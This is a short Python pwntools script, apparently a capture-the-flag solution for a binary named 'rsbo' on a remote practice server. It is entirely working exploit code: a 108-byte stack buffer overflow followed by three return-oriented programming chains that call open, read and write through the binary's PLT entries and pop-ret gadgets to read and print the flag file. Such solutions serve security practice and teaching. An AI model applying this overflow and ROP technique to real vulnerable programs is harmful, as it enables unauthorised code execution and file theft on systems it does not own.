from pwn import *

context.arch = 'i386'

elf = ELF( './rsbo-01c51ca9a7b9db3d69289c6dbb1cd758' )
#p = elf.process()
p = remote( 'hackme.inndy.tw', 7706 )

payload = b'\x00' * 108
bss = elf.bss()
buf1 = bss + 0x100
buf2 = bss + 0x200
read_plt = elf.plt['read']
write_plt = elf.plt['write']
open_plt = elf.plt['open']
main = elf.symbols['main']
flag = 0x80487da
entry = 0x08048490

pop_pop_ret = 0x0804879e
pop_pop_pop_ret = 0x0804879d

#rop1 = flat( [ open_plt, pop_pop_ret, flag, 0, read_plt, pop_pop_pop_ret, 3, buf1, 0x50, write_plt, pop_pop_pop_ret, 1, buf1, 0x50, entry ] )
rop1 = flat( [ open_plt, pop_pop_ret, flag, 0, entry ] )
rop2 = flat( [ read_plt, entry, 3, buf1, 0x60 ] )
rop3 = flat( [ write_plt, pop_pop_pop_ret, 1, buf1, 0x60, entry ] )

raw_input()
p.send( payload + rop1 )
p.send( payload + rop2 )
p.send( payload + rop3 )

p.interactive()
